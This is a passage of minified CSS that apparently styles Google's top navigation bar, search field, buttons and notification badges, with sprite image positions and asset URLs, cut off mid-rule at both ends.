a.gb_h:hover,#gb#gb.gb_i a.gb_h:focus{color:#000}.gb_k{border-top:4px solid #404040;border-left:4px dashed transparent;border-right:4px dashed transparent;display:inline-block;margin-left:6px;vertical-align:middle}.gb_i .gb_k{border-top-color:#999}.gb_l:hover .gb_k{border-top-color:#000}.gb_m .gb_h{font-weight:bold;text-shadow:0 1px 1px rgba(255,255,255,.9)}.gb_n .gb_h{font-weight:bold;text-shadow:0 1px 1px rgba(0,0,0,.6)}#gb#gb.gb_n.gb_n a.gb_h{color:#fff}.gb_n.gb_n .gb_k{border-top-color:#fff}.gb_m .gb_d,.gb_n .gb_d{-moz-box-shadow:0 1px 2px rgba(0,0,0,.2);box-shadow:0 1px 2px rgba(0,0,0,.2)}.gb_m .gb_d:hover,.gb_n .gb_d:hover,.gb_m .gb_d:focus,.gb_n .gb_d:focus{-moz-box-shadow:0 1px 0 rgba(0,0,0,.15),0 1px 2px rgba(0,0,0,.2);box-shadow:0 1px 0 rgba(0,0,0,.15),0 1px 2px rgba(0,0,0,.2)}.gb_o .gb_p,.gb_q .gb_p{position:absolute;right:1px}.gb_p.gb_r,.gb_s.gb_r,.gb_l.gb_r{flex:0 1 auto;flex:0 1 main-size}.gb_e.gb_t .gb_h{width:30px!important}.gb_h~.gb_u,.gb_h~.gb_v{left:auto;right:6.5px}.gb_w{outline:none}#gb a.gb_x.gb_x,#gb .gb_y.gb_y a{color:#36c;text-decoration:none}#gb a.gb_x:active,#gb a.gb_x:hover,#gb .gb_y a:active,#gb .gb_y a:hover{text-decoration:underline}.gb_z{margin:20px}.gb_A,.gb_B{display:inline-block;vertical-align:top}.gb_A{margin-right:20px;position:relative}.gb_g{background-size:96px 96px;border:none;vertical-align:top;height:96px;width:96px}.gb_C{background:rgba(78,144,254,.7);bottom:0;color:#fff;font-size:9px;font-weight:bold;left:0;line-height:9px;position:absolute;padding:7px 0;text-align:center;width:96px}.gb_D{font-weight:bold;margin:-4px 0 1px 0}.gb_E{color:#666}.gb_y{color:#ccc;margin:6px 0}.gb_y a{margin:0 10px}.gb_y a:first-child{margin-left:0}.gb_y a:last-child{margin-right:0}.gb_B .gb_a{background:#4d90fe;border-color:#3079ed;font-weight:bold;margin:10px 0 0 0}#gb .gb_B a.gb_a.gb_a{color:#fff}.gb_B .gb_a:hover{background:#357ae8;border-color:#2f5bb7}.gb_F{background:#f5f5f5;border-top:1px solid #ccc;border-color:rgba(0,0,0,.2);padding:10px 0;width:100%;display:table}.gb_F .gb_a{margin:0 20px}.gb_F>div{display:table-cell;text-align:right}.gb_F>div:first-child{text-align:left}.gb_F .gb_H{display:block;text-align:center}.gb_I .gb_u{border-bottom-color:#fef9db}.gb_J{background:#fef9db;font-size:11px;padding:10px 20px;white-space:normal}.gb_J b,.gb_x{white-space:nowrap}.gb_K{background:#f5f5f5;border-top:1px solid #ccc;border-top-color:rgba(0,0,0,.2);max-height:230px;overflow:auto}.gb_L{border-top:1px solid #ccc;border-top-color:rgba(0,0,0,.2);display:block;padding:10px 20px}.gb_M .gb_L:focus .gb_N{outline:1px dotted #fff}.gb_L:hover{background:#eee}.gb_L:first-child,.gb_O:first-child+.gb_L{border-top:0}.gb_O{display:none}.gb_P{cursor:default}.gb_P:hover{background:transparent}.gb_Q{border:none;vertical-align:top;height:48px;width:48px}.gb_N{display:inline-block;margin:6px 0 0 10px}.gb_P .gb_Q,.gb_P .gb_N{opacity:.4}.gb_R{color:#000}.gb_P .gb_R{color:#666}.gb_S{color:#666}.gb_T{background:#f5f5f5;border-top:1px solid #ccc;border-top-color:rgba(0,0,0,.2);display:block;padding:10px 20px}.gb_U{background-position:0 -1287px;display:inline-block;margin:1px 0;vertical-align:middle;height:25px;width:25px}.gb_f .gb_U::before{left:0;top:-1287px}.gb_V{color:#427fed;display:inline-block;padding:0 25px 0 10px;vertical-align:middle;white-space:normal}.gb_T:hover .gb_V{text-decoration:underline}.gb_Vc{color:#000;left:0;min-width:1177px;position:absolute;top:0;-moz-user-select:-moz-none;width:100%}.gb_6b{font:13px/27px Arial,sans-serif;position:relative;height:60px;width:100%}.gb_i .gb_6b{height:28px}#gba{height:60px}#gba.gb_i{height:28px}#gba.gb_Wc{height:90px}#gba.gb_Wc.gb_i{height:58px}.gb_6b>.gb_r{height:60px;line-height:58px;vertical-align:middle}.gb_i .gb_6b>.gb_r{height:28px;line-height:26px}.gb_6b::before{background:#e5e5e5;bottom:0;content:'';display:none;height:1px;left:0;position:absolute;right:0}.gb_6b{background:#f1f1f1}.gb_Xc .gb_6b{background:#fff}.gb_Xc .gb_6b::before,.gb_i .gb_6b::before{display:none}.gb_m .gb_6b,.gb_n .gb_6b,.gb_i .gb_6b{background:transparent}.gb_m .gb_6b::before{background:#e1e1e1;background:rgba(0,0,0,.12)}.gb_n .gb_6b::before{background:#333;background:rgba(255,255,255,.2)}.gb_r{display:inline-block;flex:0 0 auto;flex:0 0 main-size}.gb_r.gb_Zc{float:right;order:1}.gb_0c{white-space:nowrap}.gb_pa .gb_0c{display:-webkit-flex;display:flex}.gb_0c,.gb_r{margin-left:0!important;margin-right:0!important}.gb_2{background-image:url('//ssl.gstatic.com/gb/images/v1_376447c3.png');background-size:112px 2011px}@media (min-resolution:1.25dppx),(-webkit-min-device-pixel-ratio:1.25),(min-device-pixel-ratio:1.25){.gb_2{background-image:url('//ssl.gstatic.com/gb/images/v2_dfcf401a.png')}}#gbsfw{min-width:400px;overflow:visible}.gb_5a,#gbsfw.gb_ia{display:block;outline:none}#gbsfw.gb_Pa iframe{display:none}.gb_6a{padding:118px 0;text-align:center}.gb_7a{background:no-repeat center 0;color:#aaa;font-size:13px;line-height:20px;padding-top:76px;background-image:url('//ssl.gstatic.com/gb/images/a/f5cdd88b65.png')}.gb_7a a{color:#4285f4;text-decoration:none}.gb_f .gb_0 .gb_2::before{left:0;top:-1943px}.gb_f.gb_n .gb_0 .gb_2::before{left:0;top:-138px}.gb_f.gb_m .gb_0 .gb_2::before{left:0;top:-264px}.gb_f .gb_3{background-image:none!important}.gb_f .gb_4{visibility:visible}.gb_M .gb_8a span{background:transparent}.gb_W{min-width:152px;overflow:hidden;position:relative;z-index:987}.gb_X{position:absolute;padding:0 30px 0 30px}.gb_Z .gb_X{right:100%;margin-right:-152px}.gb_0{display:inline-block;outline:none;vertical-align:middle}.gb_1 .gb_0{position:relative;top:2px}.gb_0 .gb_2,.gb_3{display:block}.gb_4{border:none;display:block;visibility:hidden}.gb_0 .gb_2{background-position:0 -1943px;height:33px;width:92px}.gb_3{background-repeat:no-repeat}.gb_n .gb_0 .gb_2{background-position:0 -138px;margin:-3px 0 0 -10px;height:52px;width:112px}.gb_m .gb_0 .gb_2{margin:-3px 0 0 -10px;height:52px;width:112px;background-position:0 -264px}@-moz-keyframes gb__nb{0%{-moz-transform:scale(0,0);transform:scale(0,0)}20%{-moz-transform:scale(1.4,1.4);transform:scale(1.4,1.4)}50%{-moz-transform:scale(.8,.8);transform:scale(.8,.8)}85%{-moz-transform:scale(1.1,1.1);transform:scale(1.1,1.1)}to{-moz-transform:scale(1.0,1.0);transform:scale(1.0,1.0)}}@keyframes gb__nb{0%{-moz-transform:scale(0,0);transform:scale(0,0)}20%{-moz-transform:scale(1.4,1.4);transform:scale(1.4,1.4)}50%{-moz-transform:scale(.8,.8);transform:scale(.8,.8)}85%{-moz-transform:scale(1.1,1.1);transform:scale(1.1,1.1)}to{-moz-transform:scale(1.0,1.0);transform:scale(1.0,1.0)}}.gb_9a .gb_fa{font-size:14px;font-weight:bold;top:0;right:0}.gb_9a .gb_ga{display:inline-block;vertical-align:middle;-moz-box-sizing:border-box;box-sizing:border-box;height:30px;width:30px}.gb_ab{background-position:0 -1218px;opacity:.55;height:100%;width:100%}.gb_ga:hover .gb_ab,.gb_ga:focus .gb_ab{opacity:.85}.gb_bb .gb_ab{background-position:0 -1981px}.gb_cb{background-color:#cb4437;-moz-border-radius:8px;border-radius:8px;font:bold 11px Arial;color:#fff;line-height:16px;min-width:14px;padding:0 1px;position:absolute;right:0;text-align:center;text-shadow:0 1px 0 rgba(0,0,0,0.1);top:0;visibility:hidden;z-index:990}.gb_db .gb_cb,.gb_db .gb_eb,.gb_db .gb_eb.gb_fb{visibility:visible}.gb_eb{padding:0 2px;visibility:hidden}.gb_9a:not(.gb_gb) .gb_v,.gb_9a:not(.gb_gb) .gb_u{left:3px}.gb_9a .gb_u{border-bottom-color:#e5e5e5}.gb_cb.gb_hb{-moz-animation:gb__nb .6s 1s both ease-in-out;animation:gb__nb .6s 1s both ease-in-out;-moz-perspective-origin:top right;perspective-origin:top right;-moz-transform:scale(1,1);transform:scale(1,1);-moz-transform-origin:top right;transform-origin:top right}.gb_hb .gb_eb{visibility:visible}.gb_ib{background-color:rgba(0,0,0,.55);color:#fff;font-size:12px;font-weight:bold;line-height:20px;margin:5px;padding:0 2px;text-align:center;-moz-box-sizing:border-box;box-sizing:border-box;-moz-border-radius:50%;border-radius:50%;height:20px;width:20px}.gb_ib.gb_jb{background-position:-69px -69px}.gb_ib.gb_kb{background-position:0 -977px}.gb_ga:hover .gb_ib,.gb_ga:focus .gb_ib{background-color:rgba(0,0,0,.85)}#gbsfw.gb_lb{background:#e5e5e5;border-color:#ccc}.gb_m .gb_ga .gb_ab{background-position:-69px -459px;opacity:.7}.gb_m .gb_bb .gb_ab{background-position:0 -1317px}.gb_m .gb_ga:hover .gb_ab,.gb_m .gb_ga:focus .gb_ab{opacity:.85}.gb_n .gb_ga .gb_ab{background-position:0 -1356px;opacity:1}.gb_n .gb_bb .gb_ab{background-position:0 -1425px}.gb_m .gb_cb,.gb_n .gb_cb{border:none;-moz-box-shadow:-1px 1px 1px rgba(0,0,0,.2);box-shadow:-1px 1px 1px rgba(0,0,0,.2)}.gb_m .gb_ib{background-color:rgba(0,0,0,.7);-moz-box-shadow:0 1px 2px rgba(255,255,255,.9);box-shadow:0 1px 2px rgba(255,255,255,.9)}.gb_n .gb_ib.gb_ib{background-color:#fff;color:#404040;-moz-box-shadow:0 1px 2px rgba(0,0,0,.2);box-shadow:0 1px 2px rgba(0,0,0,.2)}.gb_n .gb_ib.gb_jb{background-position:-69px -390px}.gb_n .gb_ib.gb_kb{background-position:-69px -1598px}.gb_db .gb_ib.gb_ib{background-color:#db4437;color:#fff}.gb_db .gb_ga:hover .gb_ib,.gb_db .gb_ga:focus .gb_ib{background-color:#a52714}.gb_db .gb_ib.gb_kb{background-position:0 -977px}.gb_f .gb_ab::before{left:0;top:-1218px}.gb_f .gb_bb .gb_ab::before{left:0;top:-1981px}.gb_f.gb_m .gb_ga .gb_ab::before{left:-69px;top:-459px}.gb_f.gb_m .gb_bb .gb_ab::before{left:0;top:-1317px}.gb_f.gb_n .gb_ga .gb_ab::before{left:0;top:-1356px}.gb_f.gb_n .gb_bb .gb_ab::before{left:0;top:-1425px}.gb_M .gb_ib{border:1px solid #fff;color:#fff}.gb_M.gb_m .gb_ib{border-color:#000;color:#000}.gb_f .gb_ib.gb_jb::before,.gb_M.gb_f.gb_n .gb_ib.gb_jb::before{left:-69px;top:-69px}.gb_f .gb_ib.gb_kb::before,.gb_M.gb_f.gb_n .gb_ib.gb_kb::before{left:0;top:-977px}.gb_f.gb_n .gb_ib.gb_jb::before,.gb_M.gb_f.gb_m .gb_ib.gb_jb::before{left:-69px;top:-390px}.gb_f.gb_n .gb_ib.gb_kb::before,.gb_M.gb_f.gb_m .gb_ib.gb_kb::before{left:-69px;top:-1598px}.gb_nb{display:none;margin:28px;margin-bottom:-12px;outline:none;position:relative;width:264px;z-index:1;-moz-border-radius:2px;border-radius:2px;-moz-box-shadow:0 1px 2px rgba(0,0,0,0.1),0 0 1px rgba(0,0,0,0.1);box-shadow:0 1px 2px rgba(0,0,0,0.1),0 0 1px rgba(0,0,0,0.1)}.gb_nb.gb_ia{display:block}.gb_mb{background-size:64px 64px;display:inline-block;margin:12px;vertical-align:top;height:64px;width:64px}.gb_pb{display:inline-block;padding:16px 16px 16px 0;vertical-align:top;white-space:normal}.gb_mb~.gb_pb{margin-right:88px}.gb_pb:first-child{padding-left:16px}.gb_qb{color:#262626;font:16px/24px Arial,sans-serif}.gb_rb{color:#737373;font:13px/18px Arial,sans-serif}#gb#gb .gb_nb .gb_sb{color:#427fed;text-decoration:none}#gb#gb .gb_nb .gb_sb:hover{text-decoration:underline}.gb_nb .gb_ob{background-position:0 -632px;cursor:pointer;opacity:.27;outline:none;position:absolute;right:4px;top:4px;height:12px;width:12px}.gb_nb .gb_ob:hover{opacity:.55}.gb_ea.gb_ub{padding:0}.gb_ub .gb_ha{padding:26px 26px 22px 13px;background:#ffffff}.gb_vb.gb_ub .gb_ha{background:#4d90fe}a.gb_wb{color:#666666!important;font-size:22px;height:9px;opacity:.8;position:absolute;right:14px;top:4px;text-decoration:none!important;width:9px}.gb_vb a.gb_wb{color:#c1d1f4!important}a.gb_wb:hover,a.gb_wb:active{opacity:1}.gb_xb{padding:0;width:258px;white-space:normal;display:table}.gb_vb .gb_xb{width:200px}.gb_yb{color:#333333;font-size:16px;line-height:20px;margin:0;margin-bottom:16px}.gb_vb .gb_yb{color:#ffffff}.gb_zb{color:#666666;line-height:17px;margin:0;margin-bottom:5px}.gb_vb .gb_zb{color:#ffffff}.gb_Ab{position:absolute;background:transparent;top:-999px;z-index:-1;visibility:hidden;margin-top:1px;margin-left:1px}#gb .gb_ub{margin:0}.gb_ub .gb_a{background:#4d90fe;border-color:#3079ed;margin-top:15px}#gb .gb_ub a.gb_a.gb_a{color:#ffffff}.gb_ub .gb_a:hover{background:#357ae8;border-color:#2f5bb7}.gb_Bb .gb_fa .gb_u{border-bottom-color:#ffffff;display:block}.gb_Cb .gb_fa .gb_u{border-bottom-color:#4d90fe;display:block}.gb_Bb .gb_fa .gb_v,.gb_Cb .gb_fa .gb_v{display:block}.gb_Db,.gb_Eb{display:table-cell}.gb_Db{vertical-align:middle}.gb_Eb{padding-left:13px;width:100%}.gb_Fb{margin-bottom:32px;font-size:small}.gb_Fb .gb_Hb{margin-right:5px}.gb_Fb .gb_Ib{color:red}.gb_Jb{color:#ffffff;font-size:13px;font-weight:bold;height:25px;line-height:19px;padding-top:5px;padding-left:12px;position:relative;background-color:#4d90fe}.gb_Jb .gb_ob{color:#ffffff;cursor:default;font-size:22px;font-weight:normal;position:absolute;right:12px;top:5px}.gb_Jb .gb_sb,.gb_Jb .gb_Kb{color:#ffffff;display:inline-block;font-size:11px;margin-left:16px;padding:0 8px;white-space:nowrap}.gb_Lb{background:none;background-image:-moz-linear-gradient(top,rgba(0,0,0,0.16),rgba(0,0,0,0.2));background-image:linear-gradient(top,rgba(0,0,0,0.16),rgba(0,0,0,0.2));background-image:-moz-linear-gradient(top,rgba(0,0,0,0.16),rgba(0,0,0,0.2));-moz-border-radius:2px;border-radius:2px;border:1px solid #dcdcdc;border:1px solid rgba(0,0,0,0.1);cursor:default!important;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#160000ff,endColorstr=#220000ff);text-decoration:none!important}.gb_Lb:hover{background:none;background-image:-moz-linear-gradient(top,rgba(0,0,0,0.14),rgba(0,0,0,0.2));background-image:linear-gradient(top,rgba(0,0,0,0.14),rgba(0,0,0,0.2));background-image:-moz-linear-gradient(top,rgba(0,0,0,0.14),rgba(0,0,0,0.2));border:1px solid rgba(0,0,0,0.2);box-shadow:0 1px 1px rgba(0,0,0,0.1);-moz-box-shadow:0 1px 1px rgba(0,0,0,0.1);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#14000000,endColorstr=#22000000)}.gb_Lb:active{box-shadow:inset 0 1px 2px rgba(0,0,0,0.3);-moz-box-shadow:inset 0 1px 2px rgba(0,0,0,0.3)}.gb_tb{display:none}.gb_tb.gb_ia{display:block}.gb_f .gb_mb{background-image:none!important}.gb_f .gb_mb::before{display:inline-block;-moz-transform:scale(.5);transform:scale(.5);-moz-transform-origin:0 0;transform-origin:0 0}.gb_f .gb_nb .gb_ob{position:absolute}.gb_f .gb_nb .gb_ob::before{left:0;top:-632px}.gbqfb,.gbqfba,.gbqfbb{cursor:default!important;display:inline-block;font-weight:bold;height:29px;line-height:29px;min-width:54px;padding:0 8px;text-align:center;text-decoration:none!important;-moz-border-radius:2px;border-radius:2px;-moz-user-select:-moz-none}.gbqfba:focus{border:1px solid #4d90fe;outline:none;-moz-box-shadow:inset 0 0 0 1px #fff;box-shadow:inset 0 0 0 1px #fff}.gbqfba:hover{border-color:#c6c6c6;color:#222!important;-moz-box-shadow:0 1px 0 rgba(0,0,0,.15);box-shadow:0 1px 0 rgba(0,0,0,.15);background:#f8f8f8;background:-moz-linear-gradient(top,#f8f8f8,#f1f1f1);background:linear-gradient(top,#f8f8f8,#f1f1f1);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#f8f8f8,endColorstr=#f1f1f1,GradientType=1)}.gbqfba:hover:focus{-moz-box-shadow:0 1px 0 rgba(0,0,0,.15),inset 0 0 0 1px #fff;box-shadow:0 1px 0 rgba(0,0,0,.15),inset 0 0 0 1px #fff}.gbqfb::-moz-focus-inner{border:0}.gbqfba::-moz-focus-inner{border:0}.gbqfba{border:1px solid #dcdcdc;border-color:rgba(0,0,0,0.1);color:#444!important;font-size:11px;background:#f5f5f5;background:-moz-linear-gradient(top,#f5f5f5,#f1f1f1);background:linear-gradient(top,#f5f5f5,#f1f1f1);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#f5f5f5,endColorstr=#f1f1f1,GradientType=1)}.gbqfba:active{-moz-box-shadow:inset 0 1px 2px rgba(0,0,0,0.1);box-shadow:inset 0 1px 2px rgba(0,0,0,0.1)}.gb_Pb{position:relative;width:650px;z-index:986}#gbq2{padding-top:15px}.gb_pa .gb_Pb{min-width:200px;flex:0 2 auto;flex:0 2 main-size}.gb_ra~.gb_Pb{min-width:0}.gb_pa #gbqf{margin-right:0;display:-webkit-flex;display:flex}.gb_pa .gbqff{min-width:0;flex:1 1 auto;flex:1 1 main-size}.gb_f .gbqfi::before{left:-69px;top:-1623px}.gb_M .gbqfb:focus .gbqfi{outline:1px dotted #fff}#gbq2{display:block}#gbqf{display:block;margin:0;margin-right:60px;white-space:nowrap}.gbqff{border:none;display:inline-block;margin:0;padding:0;vertical-align:top;width:100%}.gbqfqw,#gbqfb,.gbqfwa{vertical-align:top}#gbqfaa,#gbqfab,#gbqfqwb{position:absolute}#gbqfaa{left:0}#gbqfab{right:0}.gbqfqwb,.gbqfqwc{right:0;left:0;height:100%}.gbqfqwb{padding:0 8px}#gbqfbw{display:inline-block;vertical-align:top}#gbqfb{border:1px solid transparent;border-bottom-left-radius:0;border-top-left-radius:0;height:30px;margin:0;outline:none;padding:0 0;width:60px;-moz-box-shadow:none;box-shadow:none;-moz-box-sizing:border-box;box-sizing:border-box;background:#4285f4;background:-moz-linear-gradient(top,#4387fd,#4683ea);background:linear-gradient(top,#4387fd,#4683ea);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#4387fd,endColorstr=#4683ea,GradientType=1)}#gbqfb:hover{-moz-box-shadow:0 1px 0 rgba(0,0,0,.15);box-shadow:0 1px 0 rgba(0,0,0,.15)}#gbqfb:focus{-moz-box-shadow:inset 0 0 0 1px #fff;box-shadow:inset 0 0 0 1px #fff}#gbqfb:hover:focus{-moz-box-shadow:0 1px 0 rgba(0,0,0,.15),inset 0 0 0 1px #fff;box-shadow:0 1px 0 rgba(0,0,0,.15),inset 0 0 0 1px #fff}#gbqfb:active:active{border:1px solid transparent;-moz-box-shadow:inset 0 2px 0 rgba(0,0,0,.15);box-shadow:inset 0 2px 0 rgba(0,0,0,.15);background:#3c78dc;background:-moz-linear-gradient(top,#3c7ae4,#3f76d3);background:linear-gradient(top,#3c7ae4,#3f76d3);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#3c7ae4,endColorstr=#3f76d3,GradientType=1)}.gbqfi{background-position:-69px -1623px;display:inline-block;margin:-1px;height:30px;width:30px}.gbqfqw{background:#fff;background-clip:padding-box;border:1px solid #cdcdcd;border-color:rgba(0,0,0,.15);border-right-width:0;height:30px;-moz-box-sizing:border-box;box-sizing:border-box}#gbfwc .gbqfqw{border-right-width:1px}#gbqfqw{position:relative}.gbqfqw.gbqfqw:hover{border-color:#a9a9a9;border-color:rgba(0,0,0,.3)}.gbqfwa{display:inline-block;width:100%}.gbqfwb{width:40%}.gbqfwc{width:60%}.gbqfwb .gbqfqw{margin-left:10px}.gbqfqw.gbqfqw:active,.gbqfqw.gbqfqwf.gbqfqwf{border-color:#4285f4}#gbqfq,#gbqfqb,#gbqfqc{background:transparent;border:none;height:20px;margin-top:4px;padding:0;vertical-align:top;width:100%}#gbqfq:focus,#gbqfqb:focus,#gbqfqc:focus{outline:none}.gbqfif,.gbqfsf{color:#222;font:16px arial,sans-serif}#gbqfbwa{display:none;text-align:center;height:0}#gbqfbwa .gbqfba{margin:16px 8px}#gbqfsa,#gbqfsb{font:bold 11px/27px Arial,sans-serif!important;vertical-align:top}.gb_m .gbqfqw.gbqfqw,.gb_n .gbqfqw.gbqfqw{border-color:rgba(255,255,255,1);-moz-box-shadow:0 1px 2px rgba(0,0,0,.2);box-shadow:0 1px 2px rgba(0,0,0,.2)}.gb_m #gbqfb,.gb_n #gbqfb{-moz-box-shadow:0 1px 2px rgba(0,0,0,.2);box-shadow:0 1px 2px rgba(0,0,0,.2)}.gb_m #gbqfb:hover,.gb_n #gbqfb:hover{-moz-box-shadow:0 1px 0 rgba(0,0,0,.15),0 1px 2px rgba(0,0,0,.2);box-shadow:0 1px 0 rgba(0,0,0,.15),0 1px 2px rgba(0,0,0,.2)}.gb_m #gbqfb:active,.gb_n #gbqfb:active{-moz-box-shadow:inset 0 2px 0 rgba(0,0,0,.15),0 1px 2px rgba(0,0,0,.2);box-shadow:inset 0 2px 0 rgba(0,0,0,.15),0 1px 2px rgba(0,0,0,.2)}.gb_2b .gb_ga{background-position:-69px -666px;opacity:.55;height:30px;width:30px}.gb_2b .gb_ga:hover,.gb_2b .gb_ga:focus{opacity:.85}.gb_2b .gb_u{border-bottom-color:#f5f5f5}#gbsfw.gb_3b{background:#f5f5f5;border-color:#ccc}.gb_n .gb_2b .gb_ga{background-position:0 -942px;opacity:1}.gb_m .gb_2b .gb_ga{background-position:-70px -1981px;opacity:.7}.gb_m .gb_2b .gb_ga:hover,.gb_m .gb_2b .gb_ga:focus{opacity:.85}.gb_f .gb_2b .gb_ga::before{left:-69px;top:-666px}.gb_f.gb_m .gb_2b .gb_ga::before{left:-70px;top:-1981px}.gb_f.gb_n .gb_2b .gb_ga::before{left:0;top:-942px}.gb_pc{width:480px}.gb_qc{background:#e7e7e7;background:rgba(0,0,0,.04);border-bottom-right-radius:0;line-height:30px;position:relative;text-align:center;width:100%}.gb_qc:hover{background:#dbdbdb;background:rgba(0,0,0,.08)}.gb_qc .gb_rc{margin:0 10px}.gb_sc{position:relative;z-index:1}.gb_tc{background:#eee;border-bottom:1px solid #e3e3e3;border-left:1px solid #e3e3e3;display:inline-block;line-height:32px;text-align:center;width:160px}.gb_sc .gb_tc:first-child{border-left:none}.gb_sc .gb_ia{background:#fff;border-bottom:none}.gb_uc{display:none;text-align:center}.gb_uc.gb_ia{display:block}.gb_vc{color:inherit;display:inline-block;padding:15px;text-decoration:none}.gb_wc{background-clip:content-box;background-origin:content-box;display:inherit;height:64px;width:64px}.gb_xc{display:block;text-align:center}.gb_yc{border-top:none;top:78px;z-index:1;-moz-border-radius:0 0 2px 2px;border-radius:0 0 2px 2px}.gb_zc{display:inline-block;vertical-align:middle}.gb_Ac{display:inline-block;vertical-align:middle;background-size:100%;height:20px;width:20px}.gb_Bc{background-image:url('//ssl.gstatic.com/gb/images/a/5a1c013d3d.png')}.gb_Cc{background-image:url('//ssl.gstatic.com/gb/images/a/de580e5330.png')}.gb_Dc{background-image:url('//ssl.gstatic.com/gb/images/a/451603daf6.png')}.gb_zc{margin-left:4px}.gb_Ec{margin:5px;width:470px}.gb_Fc{border:none;display:block;margin:0 5px;outline:none;padding:0 5px;height:30px;width:450px}.gb_Hc{border:none;display:block;margin:0 5px;outline:none;padding:0 5px;height:30px;width:450px;border-top:1px solid #e3e3e3}.gb_Ic{border-color:#e3e3e3;display:block;font:inherit;margin:0 5px;outline:none;padding:5px;text-align:left;height:320px;width:450px}.gb_Jc,.gb_Kc{border:1px solid #e3e3e3;-moz-border-radius:2px;border-radius:2px;cursor:pointer;line-height:27px;margin:5px;padding:0 8px;width:54px}.gb_Jc{float:left}.gb_Kc{float:right}.gb_e{min-width:315px;padding-left:30px;padding-right:30px;position:relative;text-align:right;z-index:986;align-items:center;justify-content:flex-end}.gb_i .gb_e{min-width:0}.gb_e.gb_r{flex:1 1 auto;flex:1 1 main-size}.gb_ba{line-height:normal;position:relative;text-align:left}.gb_ba.gb_r,.gb_Lc.gb_r,.gb_j.gb_r{flex:0 1 auto;flex:0 1 main-size}.gb_Mc,.gb_Nc{display:inline-block;padding:0 0 0 15px;position:relative;vertical-align:middle}.gb_Lc{line-height:normal;padding-right:15px}.gb_e .gb_Lc.gb_qa{padding-right:0}.gb_j{color:#404040;line-height:30px;min-width:30px;overflow:hidden;vertical-align:middle;text-overflow:ellipsis}#gb.gb_i.gb_i .gb_ic,#gb.gb_i.gb_i .gb_ba>.gb_Nc .gb_jc{background:none;border:none;color:#36c;cursor:pointer;filter:none;font-size:11px;line-height:26px;padding:0;-moz-box-shadow:none;box-shadow:none}#gb.gb_i.gb_n .gb_ic,#gb.gb_i.gb_n .gb_ba>.gb_Nc .gb_jc{color:#fff}.gb_i .gb_ic{text-transform:uppercase}.gb_e.gb_ra{padding-left:0;padding-right:29px}.gb_e.gb_Oc{max-width:400px}.gb_Pc{background-clip:content-box;background-origin:content-box;opacity:.27;padding:22px;height:16px;width:16px}.gb_Pc.gb_r{display:none}.gb_Pc:hover,.gb_Pc:focus{opacity:.55}.gb_Qc{background-position:-69px -825px}.gb_Rc{background-position:-69px -804px;padding-left:30px;padding-right:14px;position:absolute;right:0;top:0;z-index:990}.gb_o:not(.gb_q) .gb_Rc,.gb_ra .gb_Qc{display:inline-block}.gb_o .gb_Qc{padding-left:30px;padding-right:0;width:0}.gb_o:not(.gb_q) .gb_Sc{display:none}.gb_e.gb_r.gb_ra,.gb_ra:not(.gb_q) .gb_ba{flex:0 0 auto;flex:0 0 main-size}.gb_Pc,.gb_ra .gb_Lc,.gb_q .gb_ba{overflow:hidden}.gb_o .gb_Lc{padding-right:0}.gb_ra .gb_ba{padding:1px 1px 1px 0}.gb_o .gb_ba{width:75px}.gb_e.gb_Tc,.gb_e.gb_Tc .gb_Qc,.gb_e.gb_Tc .gb_Qc::before,.gb_e.gb_Tc .gb_Lc,.gb_e.gb_Tc .gb_ba{-moz-transition:width .5s ease-in-out,min-width .5s ease-in-out,max-width .5s ease-in-out,padding .5s ease-in-out,left .5s ease-in-out;transition:width .5s ease-in-out,min-width .5s ease-in-out,max-width .5s ease-in-out,padding .5s ease-in-out,left .5s ease-in-out}.gb_pa .gb_e{min-width:0}.gb_e.gb_t,.gb_e.gb_t .gb_ba,.gb_e.gb_Uc,.gb_e.gb_Uc .gb_ba{min-width:0!important}.gb_e.gb_t,.gb_e.gb_t .gb_r{flex:0 0 auto!important}.gb_e.gb_t .gb_j{width:30px!important}.gb_m .gb_j{font-weight:bold;text-shadow:0 1px 1px rgba(255,255,255,.9)}.gb_n .gb_j{color:#fff;font-weight:bold;text-shadow:0 1px 1px rgba(0,0,0,.6)}.gb_f .gb_Qc::before{clip:rect(825px 85px 841px 69px);left:-47px;top:-803px}.gb_f .gb_2.gb_Rc{position:absolute}.gb_f .gb_Rc::before{clip:rect(804px 85px 820px 69px);left:-39px;top:-782px}.gb_f .gb_o .gb_Qc::before{left:-39px}@media (min-resolution:1.25dppx),(-webkit-min-device-pixel-ratio:1.25),(min-device-pixel-ratio:1.25){.gb_f .gb_Qc::before{clip:rect(1650px 170px 1682px 138px)}.gb_f .gb_Rc::before{clip:rect(1608px 170px 1640px 138px)}}.gb_f .gb_2,.gb_f .gbii,.gb_f .gbip{background-image:none;overflow:hidden;position:relative}.gb_f .gb_2::before{content:url('//ssl.gstatic.com/gb/images/v1_376447c3.png');position:absolute}@media (min-resolution:1.25dppx),(-webkit-min-device-pixel-ratio:1.25),(min-device-pixel-ratio:1.25){.gb_f .gb_2::before{content:url('//ssl.gstatic.com/gb/images/v2_dfcf401a.png');-moz-transform:scale(.5);transform:scale(.5);-moz-transform-origin:0 0;transform-origin:0 0}}.gb_M a:focus{outline:1px dotted #fff!important}sentinel{}#gbq .gbgt-hvr,#gbq .gbgt:focus{background-color:transparent;background-image:none}.gbqfh#gbq1{display:none}.gbxx{display:none !important}#gbq{line-height:normal;position:relative;top:0px;white-space:nowrap}#gbq{left:0;width:100%}#gbq2{top:0px;z-index:986}#gbq4{display:inline-block;max-height:29px;overflow:hidden;position:relative}.gbqfh#gbq2{z-index:985}.gbqfh#gbq2{margin:0;margin-left:0 !important;padding-top:0;position:relative;top:310px}.gbqfh #gbqf{margin:auto;min-width:534px;padding:0 !important}.gbqfh #gbqfbw{display:none}.gbqfh #gbqfbwa{display:block}.gbqfh #gbqf{max-width:512px;min-width:200px}.gbqfh .gbqfqw{border-right-width:1px}.gbii{background-image:url(//lh6.googleusercontent.com/-fkbVGa32scw/AAAAAAAAAAI/AAAAAAAAAAA/7Jj0dHmxzRo/s32-c/photo.jpg)}.gbip{background-image:url()}.gbii::before{content:url(//lh6.googleusercontent.com/-fkbVGa32scw/AAAAAAAAAAI/AAAAAAAAAAA/7Jj0dHmxzRo/s32-c/photo.jpg);position:absolute}.gbip::before{content:url();position:absolute}@media 